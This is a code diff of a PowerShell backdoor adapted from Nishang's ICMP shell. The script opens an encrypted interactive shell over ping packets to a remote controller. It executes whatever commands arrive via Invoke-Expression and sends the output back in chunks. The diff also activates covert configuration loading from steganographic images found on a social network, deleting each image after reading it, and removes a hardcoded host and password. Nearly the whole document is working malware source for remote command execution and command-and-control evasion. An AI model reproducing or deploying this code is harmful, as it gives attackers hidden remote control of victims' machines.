@@ -57,31 +57,32 @@ https://github.com/samratashok/nishang
 
         [Parameter(Position = 2, Mandatory = $false)]
         [Int]
-        $BufferSize = 128
+        $BufferSize = 512
 
     )
     
     # todo: refactor
     $checksum = "075231516e85d9c6b60102abb767dbfde920803eb2d79af4462608f8037a1a4e"
+    $timeout = 60 * 1000
 
     $aes = [Crypto.AES]::New($Password)
 
     # Basic structure from http://stackoverflow.com/questions/20019053/sending-back-custom-icmp-echo-response
+    # todo: ICMPClient class
     $icmp = New-Object System.Net.NetworkInformation.Ping
     $opt = New-Object System.Net.NetworkInformation.PingOptions
     $opt.DontFragment = $true
-
-    $timeout = 60 * 1000
 
     # online
     $buf = $aes.Encrypt([Text.Encoding]::ASCII.GetBytes("online:" + $uid))
     $reply = $icmp.Send($IPAddress, $timeout, $buf, $opt)
     if ($reply.Buffer)
     {
-        $response = $aes.Decrypt($reply.Buffer)       
+        $response = $aes.Decrypt($reply.Buffer)
+        $response = [Text.Encoding]::ASCII.GetString($response)
         if ($response -ne $checksum)
         {
-            # invalid
+            # invalid client
             return
         }
     }
@@ -94,52 +95,52 @@ https://github.com/samratashok/nishang
     $icmp.Send($IPAddress, $timeout, $buf, $opt) | Out-Null
 
     #Show an interactive PowerShell prompt
-    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
+    $sendbytes = [Text.Encoding]::ASCII.GetBytes('PS ' + (Get-Location).Path + '> ')
     $sendbytes = $aes.Encrypt($sendbytes)
     $icmp.Send($IPAddress, $timeout, $sendbytes, $opt) | Out-Null
 
     while ($true)
     {
-        $sendbytes = ([text.encoding]::ASCII).GetBytes('')
+        $sendbytes = [Text.Encoding]::ASCII.GetBytes('')
         $sendbytes = $aes.Encrypt($sendbytes)
         $reply = $icmp.Send($IPAddress, $timeout, $sendbytes, $opt)
-        
+        $response = $aes.Decrypt($reply.Buffer)
+
         # Check for Command from the server
-        if ($reply.Buffer)
+        if ($response.Length)
         {
-            $response = $aes.Decrypt($reply.Buffer)
-            $cmd = [text.encoding]::ASCII.GetString($response)
-            $result = (Invoke-Expression -Command $cmd 2>&1 | Out-String )
+            $cmd = [Text.Encoding]::ASCII.GetString($response)
+            $result = (Invoke-Expression -Command $cmd 2>&1 | Out-String)
             $sendbytes = [text.encoding]::ASCII.GetBytes($result)
-            $index = [math]::floor($sendbytes.length / $BufferSize)
+            $index = [Math]::Floor($sendbytes.length / $BufferSize)
             $i = 0
 
-            #Fragmant larger output into smaller ones to send to the server.
-            if ($sendbytes.length -gt $BufferSize)
+            # split into pieces
+            if ($sendbytes.Length -gt $BufferSize)
             {
-                while ($i -lt $index )
+                while ($i -lt $index)
                 {
-                    $sendbytes2 = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize)]
-                    $sendbytes2 = $aes.Encrypt($sendbytes2)
-                    $icmp.Send($IPAddress, $timeout, $sendbytes2, $opt) | Out-Null
-                    $i += 1
+                    $trunk = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize)]
+                    $buf = $aes.Encrypt($trunk)
+                    $icmp.Send($IPAddress, $timeout, $buf, $opt) | Out-Null
+                    $i++
                 }
 
-                $remainingindex = $sendbytes.Length % $BufferSize
+                $tail = $sendbytes.Length % $BufferSize
                 
-                if ($remainingindex -ne 0)
+                if ($tail)
                 {
-                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($remainingindex)]
-                    $sendbytes2 = $aes.Encrypt($sendbytes2)
-                    $icmp.Send($IPAddress, $timeout, $sendbytes2, $opt) | Out-Null
+                    $trunk = $sendbytes[($i * $BufferSize)..($sendbytes.Length)]
+                    $buf = $aes.Encrypt($trunk)
+                    $icmp.Send($IPAddress, $timeout, $buf, $opt) | Out-Null
                 }
             }
             else
             {
-                $sendbytes = $aes.Encrypt($sendbytes)
-                $icmp.Send($IPAddress, $timeout, $sendbytes, $opt) | Out-Null
+                $buf = $aes.Encrypt($sendbytes)
+                $icmp.Send($IPAddress, $timeout, $buf, $opt) | Out-Null
             }
-            $sendbytes = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '> ')
+            $sendbytes = [Text.Encoding]::ASCII.GetBytes("`nPS " + (Get-Location).Path + '> ')
             $sendbytes = $aes.Encrypt($sendbytes)
             $icmp.Send($IPAddress, $timeout, $sendbytes, $opt) | Out-Null
         }
@@ -153,13 +154,10 @@ https://github.com/samratashok/nishang
 $uid = "8fd2d4d2-1385-4b66-b4da-00191f6ee044"
 
 # load config from social network
-# $config = Get-Images "thisisaninvisibletag" | % {
-# 	$buf = Read-Steg $_
-# 	$json = [System.Text.ASCIIEncoding]::ASCII.GetString($buf)
-# 	$config = ConvertFrom-Json $json
-# 	Remove-Item $_
-#     $json
-# } | Select-Object -First 1
-
-$config = @{host="chichou.me"; password="P@s5w0rd"; heartbeat=3000}
-Invoke-PowerShellIcmp -IPAddress $config.host -Password $config.password -Uid $uid
+Get-Images "thisisaninvisibletag" | % {
+	$buf = Read-Steg $_
+	$json = [System.Text.ASCIIEncoding]::ASCII.GetString($buf)
+	$config = ConvertFrom-Json $json
+	Remove-Item $_
+    Invoke-PowerShellIcmp -IPAddress $config.host -Password $config.password -Uid $uid
+}
